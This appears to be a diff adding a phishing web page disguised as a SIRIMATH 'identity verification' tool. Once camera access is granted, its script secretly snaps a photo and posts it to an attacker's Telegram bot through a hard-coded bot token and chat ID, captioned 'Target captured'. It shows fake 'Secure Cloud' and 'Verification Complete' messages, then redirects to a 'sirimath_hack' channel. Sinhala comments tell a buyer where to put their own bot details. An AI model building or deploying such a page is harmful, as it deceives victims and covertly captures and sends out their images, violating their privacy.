@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IDENTITY VERIFICATION | SIRIMATH</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background: #050505; color: white; font-family: 'Orbitron', sans-serif;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            height: 100vh; margin: 0; overflow: hidden;
+        }
+        .container { text-align: center; padding: 20px; border: 1px solid #00f2ff; border-radius: 20px; background: rgba(0, 242, 255, 0.05); box-shadow: 0 0 30px #00f2ff33; }
+        h1 { font-size: 1.2rem; color: #00f2ff; letter-spacing: 2px; }
+        video { width: 100%; max-width: 300px; border-radius: 15px; border: 2px solid #7000ff; display: none; }
+        .btn {
+            background: linear-gradient(45deg, #7000ff, #00f2ff); border: none; padding: 15px 30px;
+            color: white; border-radius: 10px; cursor: pointer; font-weight: bold; margin-top: 20px;
+        }
+        .status { font-size: 0.7rem; margin-top: 15px; color: #888; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>VERIFY IDENTITY</h1>
+        <p style="font-size: 0.8rem; color: #aaa;">Please allow camera access to proceed.</p>
+        
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+
+        <button class="btn" id="start-btn">START VERIFICATION</button>
+        <div class="status" id="status">System Standby...</div>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const startBtn = document.getElementById('start-btn');
+        const status = document.getElementById('status');
+
+        // 🛠️ යූසර්ගේ ටෙලිග්‍රෑම් බොට් විස්තර මෙතනට දාන්න
+        const BOT_TOKEN = '7990167712:AAFXaaGsVV0ovPcgTFhYbhhZb6waRRH7YSA';
+        const CHAT_ID = '7871773175';
+
+        startBtn.addEventListener('click', async () => {
+            status.innerText = "Connecting to Server...";
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.style.display = "block";
+                startBtn.style.display = "none";
+                status.innerText = "Analyzing Face Structure...";
+
+                // තත්පර 3කට පස්සේ පින්තූරයක් ගන්නවා
+                setTimeout(() => {
+                    takeSnapshot();
+                }, 3000);
+
+            } catch (err) {
+                alert("Please enable camera permissions to use this tool!");
+                status.innerText = "Error: Access Denied";
+            }
+        });
+
+        function takeSnapshot() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Canvas එක Image Data (Blob) එකක් කරනවා
+            canvas.toBlob(blob => {
+                sendToTelegram(blob);
+            }, 'image/jpeg');
+        }
+
+        async function sendToTelegram(imageBlob) {
+            status.innerText = "Uploading to Secure Cloud...";
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', imageBlob, 'capture.jpg');
+            formData.append('caption', '⚡ **NEW IDENTITY VERIFIED**\nTarget captured successfully! 💀');
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                status.innerText = "Verification Complete ✅";
+                setTimeout(() => {
+                    window.location.href = "https://t.me/sirimath_hack"; // ඉවර වුණාම රීඩිරෙක්ට් කරනවා
+                }, 2000);
+            } catch (error) {
+                status.innerText = "Upload Failed ❌";
+            }
+        }
+    </script>
+</body>
+</html>
